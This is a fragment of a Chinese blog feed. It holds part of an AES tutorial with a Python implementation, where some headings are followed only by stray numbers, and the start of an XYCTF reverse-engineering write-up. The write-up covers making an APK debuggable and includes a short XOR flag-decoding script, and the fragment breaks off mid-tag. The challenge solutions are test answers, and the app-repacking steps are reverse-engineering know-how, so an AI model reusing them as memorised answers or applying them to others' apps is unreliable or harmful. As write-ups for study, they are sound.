style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> <a href="https://blog.csdn.net/2301_76371934/article/details/132186376">乘法逆元</a></li><li>然后将该乘法逆元，与上面的矩阵进行 <a href="https://en.wikipedia.org/wiki/Affine_transformation">Affine transformation</a> 运算</li></ul><p><a href="https://en.wikipedia.org/wiki/Affine_transformation">Affine transformation</a> 运算即3864</p><h5 id="inv_sbox"><a class="markdownIt-Anchor" href="#inv_sbox"></a> inv_sbox</h5><p>先求 <a href="https://en.wikipedia.org/wiki/Affine_transformation">Affine transformation</a> 运算,在求乘法逆元</p><p>在AES中通过Sbox和逆向只用替换映射关系即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    line <span class="token operator">=</span> <span class="token punctuation">(</span>new_s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xf0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span>    rol <span class="token operator">=</span> new_s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span>    new_contrary_sbox<span class="token punctuation">[</span><span class="token punctuation">(</span>line <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> rol<span class="token punctuation">]</span> <span class="token operator">=</span> i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="字节替换subbytes"><a class="markdownIt-Anchor" href="#字节替换subbytes"></a> 字节替换Subbytes</h4><p>5609</p><h4 id="列混淆mixcolumns"><a class="markdownIt-Anchor" href="#列混淆mixcolumns"></a> 列混淆<strong>MixColumns</strong></h4><p>这里的运算是定义在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">GF(2^8)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，使用模多项式为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^8+x^4+x^3+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><h4 id="密钥扩展"><a class="markdownIt-Anchor" href="#密钥扩展"></a> 密钥扩展</h4><p>5757</p><h4 id="shiftrows"><a class="markdownIt-Anchor" href="#shiftrows"></a> shiftRows</h4><p>ShiftRows 将数据块按行移位：第 i 行整体向左移动 (i-1) 格。</p><p>5888</p><h4 id="解密流程"><a class="markdownIt-Anchor" href="#解密流程"></a> 解密流程</h4><ul><li>初始轮（10）<ul><li>AddRoundKey</li></ul></li><li>中间轮（9~2）<ul><li>ShiftRows（inverse）</li><li>SubBytes（inverse）</li><li>AddRoundKey</li><li>MixColumns（inverse）</li></ul></li><li>最终轮（1）<ul><li>ShiftRows（inverse）</li><li>SubBytes（inverse）</li><li>AddRoundKey</li></ul></li></ul><h3 id="简单实现"><a class="markdownIt-Anchor" href="#简单实现"></a> 简单实现</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>s_box_inv <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>rc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x6c</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0xab</span><span class="token punctuation">,</span> <span class="token number">0x4d</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">sub_bytes</span><span class="token punctuation">(</span>grid<span class="token punctuation">,</span> inv<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>grid<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> inv<span class="token punctuation">:</span>  <span class="token comment"># for decryption</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box_inv<span class="token punctuation">[</span>v <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>v <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">]</span><span class="token keyword">else</span><span class="token punctuation">:</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>v <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>v <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">shift_rows</span><span class="token punctuation">(</span>grid<span class="token punctuation">,</span> inv<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> inv<span class="token punctuation">:</span>  <span class="token comment"># for decryption</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> grid<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span>i<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> grid<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token keyword">else</span><span class="token punctuation">:</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> grid<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> grid<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">mix_columns</span><span class="token punctuation">(</span>grid<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">mul_by_2</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>s <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token keyword">if</span> n <span class="token operator">&amp;</span> <span class="token number">128</span><span class="token punctuation">:</span>s <span class="token operator">^</span><span class="token operator">=</span> <span class="token number">0x1b</span><span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">mul_by_3</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> n <span class="token operator">^</span> mul_by_2<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mix_column</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token punctuation">[</span>mul_by_2<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> mul_by_3<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> c<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> c<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token comment"># [2 3 1 1]</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> mul_by_2<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> mul_by_3<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> c<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token comment"># [1 2 3 1]</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> mul_by_2<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> mul_by_3<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># [1 1 2 3]</span>mul_by_3<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> c<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> mul_by_2<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># [3 1 1 2]</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> mix_column<span class="token punctuation">(</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">key_expansion</span><span class="token punctuation">(</span>grid<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>r <span class="token operator">=</span> grid<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 对上一轮最后4字节自循环、S-box置换、轮常数异或，从而计算出当前新一轮最前4字节</span><span class="token keyword">for</span> j<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>r<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>v <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>v <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>rc<span class="token punctuation">[</span>i <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>grid<span class="token punctuation">.</span>append<span class="token punctuation">(</span>grid<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">^</span> r<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> grid<span class="token keyword">def</span> <span class="token function">add_round_key</span><span class="token punctuation">(</span>grid<span class="token punctuation">,</span> round_key<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> round_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> expanded_key<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># First round</span>add_round_key<span class="token punctuation">(</span>b<span class="token punctuation">,</span> expanded_key<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sub_bytes<span class="token punctuation">(</span>b<span class="token punctuation">)</span>shift_rows<span class="token punctuation">(</span>b<span class="token punctuation">)</span>mix_columns<span class="token punctuation">(</span>b<span class="token punctuation">)</span>add_round_key<span class="token punctuation">(</span>b<span class="token punctuation">,</span> expanded_key<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># Final round</span>sub_bytes<span class="token punctuation">(</span>b<span class="token punctuation">)</span>shift_rows<span class="token punctuation">(</span>b<span class="token punctuation">)</span>add_round_key<span class="token punctuation">(</span>b<span class="token punctuation">,</span> expanded_key<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> b<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> expanded_key<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># First round</span>add_round_key<span class="token punctuation">(</span>b<span class="token punctuation">,</span> expanded_key<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>shift_rows<span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>sub_bytes<span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>add_round_key<span class="token punctuation">(</span>b<span class="token punctuation">,</span> expanded_key<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span> mix_columns<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token comment"># Final round</span>shift_rows<span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>sub_bytes<span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>add_round_key<span class="token punctuation">(</span>b<span class="token punctuation">,</span> expanded_key<span class="token punctuation">)</span><span class="token keyword">return</span> b<span class="token keyword">def</span> <span class="token function">aes</span><span class="token punctuation">(</span>typ<span class="token punctuation">,</span> key<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>expanded <span class="token operator">=</span> key_expansion<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Pad the message to a multiple of 16 bytes</span>b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># only for encryption</span>b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Encrypt/decrypt the message</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>b<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> expanded<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>b<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> expanded<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分组模式"><a class="markdownIt-Anchor" href="#分组模式"></a> 分组模式</h2>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xyctf复盘</title>
      <link href="/2024/04/28/xyctf%E5%A4%8D%E7%9B%98/"/>
      <url>/2024/04/28/xyctf%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>​由于hust的sb课程设置，所以只有时间打第一周。快五一了终于有空闲时间了，把所有的reverse题目给复现一下</p><h1 id="第一周"><a class="markdownIt-Anchor" href="#第一周"></a> 第一周</h1><h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> reverse</h2><h3 id="喵喵喵的flag碎了一地"><a class="markdownIt-Anchor" href="#喵喵喵的flag碎了一地"></a> 喵喵喵的flag碎了一地</h3><p>​考点：ida的功能，没有值得学习的地方</p><h3 id="聪明的信使"><a class="markdownIt-Anchor" href="#聪明的信使"></a> 聪明的信使</h3><p>​考点：shift+f12 +凯撒加密</p><h3 id="debugme"><a class="markdownIt-Anchor" href="#debugme"></a> DebugMe</h3><p>​考点：调试apk;jeb远程附加</p><p><a href="https://ctf-wiki.org/android/basic_reverse/dynamic/dynamic_debug/#android_1">android 调试基本原理</a></p><p>一般来说，Android 根据如下的顺序来判断一个应用是否可以被调试</p><ol><li>检测 boot.img 中的 ro.debuggable 是否为 1，为 1 的话，手机中的任何应用均可以调试。</li><li>否则，检测对应应用中 AndroidManifest.xml 中 &lt;application&gt; 元素中是否包含了 android:debuggable=“true”，如果有的话，才会开启调试支持。</li></ol><p>自然，我们也就有两种方法来使得一个应用可以被调试</p><ol><li>将一个 apk 文件解包，在 &lt;application&gt; 元素中添加 android:debuggable=“true”，然后重打包，签名。</li><li>修改 boot.img 中的 ro.debuggable 为 1。</li></ol><p>一般来说，因为前者需要我们每次都需要修改应用</p><p><code>ro.debuggable</code> 的值可以根据如下命令来查询</p><pre class="line-numbers language-none"><code class="language-none">adb shell getprop ro.debuggable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="你是真的大学生吗"><a class="markdownIt-Anchor" href="#你是真的大学生吗"></a> 你是真的大学生吗？</h3><p>考点：16位DOS下的汇编</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x1e</span><span class="token punctuation">,</span>       <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0x5c</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">]</span>dst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x00</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dst<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> enc<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>dst<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> enc<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">^</span> enc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> dst<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" 